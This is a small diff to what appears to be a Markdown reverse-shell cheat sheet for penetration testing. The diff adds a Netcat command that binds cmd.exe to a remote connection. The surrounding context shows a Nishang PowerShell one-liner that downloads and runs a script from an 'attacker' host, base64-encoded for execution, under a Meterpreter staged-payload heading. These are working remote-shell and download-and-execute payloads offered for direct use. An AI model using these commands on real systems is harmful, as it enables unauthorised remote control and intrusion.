@@ -43,6 +43,9 @@ Meterpreter Linux x64 Reverse TCP Staged
 
 # Windows
 
+Netcat
+`nc.exe -e cmd.exe ipaddress port`
+
 Nishang PowerShell Revshell (GitHub linked in Tools document)
 ```
 echo -n "IEX(new-object net.webclient).downloadstring('http://attacker/Invoke-PowerShellTcp.ps1')" | iconv -t UTF-16LE | base64 -w0 > payload.b64
